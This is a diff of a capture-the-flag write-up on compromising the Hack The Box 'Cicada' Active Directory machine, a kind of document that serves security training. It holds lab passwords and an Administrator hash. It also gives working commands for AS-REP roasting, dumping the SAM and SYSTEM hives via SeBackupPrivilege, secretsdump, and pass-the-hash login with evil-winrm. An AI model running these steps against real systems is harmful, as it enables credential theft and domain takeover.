@@ -108,7 +108,7 @@ Password: Cicada$M6Corpb*@Lp#nZp!8
 From the password spray, I found that the user michael had a valid password match.With this we can perform authenticated scans,enabling deeper exploration of SMB shares,AD, and other network resources.
 I alsoe attempted to evil-WinRM to the box, but in my case it didn't work out, may the domain user cannot authenticate to the host.The next logical steps I attempted was to enumerate the AD through the credetials
 
-Leveraging the credentials,we can perform a quick users enumeration just to see if we can be able to enumerate AD objects, and by keenly on observing the results I spotted a verbose description for the user david  that had a pasword 
+Leveraging the credentials,we can perform a quick users enumeration just to see if we can be able to enumerate AD objects, and by keenly observing the results I spotted a verbose description for the user david  that had a pasword.
 description. 
 
 ```
@@ -118,7 +118,7 @@ aRt$Lp#7t*VQ!3
 
 ![](/img/Pasted%20image%2020241231103313.png)
 
-🎭 VAPT Intel: This is a classic misconfiguration I’ve encountered frequently in internal penetration tests. It’s common for system administrators to store credentials in user descriptions, especially when creating temporary or service accounts for easy reference. 
+🎭 VAPT Intel: This is a classic misconfiguration I’ve encountered frequently in internal penetration tests. It’s common for system administrators to store credentials in user descriptions, especially when creating temporary or service accounts for easy reference.  Can be a low hanging fruit
 It's comes out handy in AD_Style engagements,some good starting point. 
 
 Putting that aside, With David credentials, I attempted authenticated SMB enumeration to see what additional resources were accessible. I executed the below commands:
@@ -146,31 +146,93 @@ From here we can grab our User Flag.
 ![](/img/Pasted%20image%2020241231115131.png)
 
 ![](/img/Pasted%20image%2020250105163258.png)
-Weh, le's first grab some coffee, and then we can come and look into Privilege escalation stufff...
+
+Weh, let's first grab some coffee, and then we can come and look into Privilege escalation stufff...
 
 ## Privilege Escalation
 As for the privilege escacation,especially in an Active Directory (AD) environment, I always find it  has a steep learning curve due to the numerous potential attack vectors.
  My usual approach involves running BloodHound and WinPEAS to gather initial insights first and pottential areas that can be a guiding factor.
 
+##### Random Checks
+```
+bloodhound-python -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' -d cicada.htb -ns 10.10.11.35 -c All -o data.zip
+```
+
+```
+impacket-GetNPUsers cicada.htb/ -dc-ip 10.10.11.35 -usersfile domainusers.txt -no-pass -outputfile asrep_hash.txt
+```
+
+![](/img/Pasted%20image%2020241231104652.png)
+
 
 📊 Situational Awareness
 To understand where we stand in terms of privileges, I first ran:
 ```
+whoami /all
 whoami /priv
 ```
-This command lists the privileges assigned to the current user.If high-privilege rights like SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege are enabled, 
-they could be leveraged for privilege escalation techniques like Juicy Potato or Token Impersonation.
+![](/img/Pasted%20image%2020250105163258.png)
 
 
-Just some checks for situational awareness, and to understand where we are stiited.
-I run whoami /privilege
+This command lists the privileges assigned to the current user.If high-privilege rights for instance SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege are enabled, 
+they could be leveraged for privilege escalation techniques like **Juicy Potato** or **Token Impersonation**.
 
-What this doe 
+![](/img/Pasted%20image%2020250105163258.png)
+
+Based on the results, we see the box allowes the users to do some backup,writable changes, memory modofications  but what does this mean in terms of privilege escalation and potential escalation stufff.let's demistify furthr
+Here’s your content in table format:
+
+| **Privilege**                              | **Description**                                                                                                                                                                                                                                                     |
+| ------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **SeBackupPrivilege & SeRestorePrivilege** | Allow a user to back up and restore files, potentially granting access to protected files, including sensitive system configurations and credentials. Could be used to read the SAM, SYSTEM, and SECURITY hives, which may contain hashed passwords of other users. |
+| **SeShutdownPrivilege**                    | Allows a user to force system reboots. While not directly exploitable for privilege escalation, it can disrupt operations or facilitate persistence techniques.                                                                                                     |
+| **SeChangeNotifyPrivilege**                | Enables file traversal even when explicit directory permissions are denied, potentially allowing access to restricted locations.                                                                                                                                    |
+| **SeIncreaseWorkingSetPrivilege**          | Used for modifying the memory limits of processes. Not commonly leveraged for privilege escalation.                                                                                                                                                                 |
+
+From alot of googling, numerous trial-and-error, rabit holes and chatgpt for the win,I saw this blog post(https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html)  that seemed to have promising escalation route.
+
+Exploitation Steps
+Since  ‘SeBackupPrivilege’ is Enabled for our user ‘emily.oscars’: It means we can be able to read any file on the system, we can leverage it to extract critical files such as SAM and SYSTEM, which contain hashed passwords of local users, including the Administrator.
+
+In a nutshell,you may ask what going on here; From my understanding we are actually abusing SeBackupPrivilege to extract sensitive system files(SAM FILES, SYSTEM). Normally, users can’t access every file on a Windows machine, but the SeBackupPrivilege setting lets a user read everything on the system (even things they normally wouldn’t have access to).
+
+Saving SAM & SYSTEM files:
+To avoid detection or AMSI blocks by Windows, I first moved to the Temp folder(Temp is also writeable) to somewhere we can access, then saved a copy of the SAM and SYSTEM files there using the following commands:
+
+```
+reg save hklm\sam c:\Temp\sam
+reg save hklm\system c:\Temp\system
+```
+
+![](/img/Pasted%20image%2020241231122509.png)
 
 
+Windows stores password information in a special **SAM file**, but the passwords are scrambled (hashed) for security.
+The **SYSTEM file** contains the secret keys needed to unscramble (decrypt) these passwords.
+
+After saving the Files, we can downloaded the files to our attacker machine:
+```
+download c:\Temp\sam
+download c:\Temp\system
+```
+![](/img/Pasted%20image%2020241231125333.png)
 
 
-### Persistence
+Once downloaded, We can use secretsdump from impacket to extract password hashes from the SAM & SYSTEM files.
+```
+impacket-secretsdump -sam sam -system system LOCAL
+```
+
+![](/img/Pasted%20image%2020241231125333.png)
+
+From the results we now have an Administrator’s password hash, which we can evil-winrm to gain root access over the machine.
+
+```
+evil-winrm -i 10.10.11.35 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
+```
+![](/img/Pasted%20image%2020241231130245.png)
+Now, we are ROOT!
+
 
 
 ## 📜 Conclusion
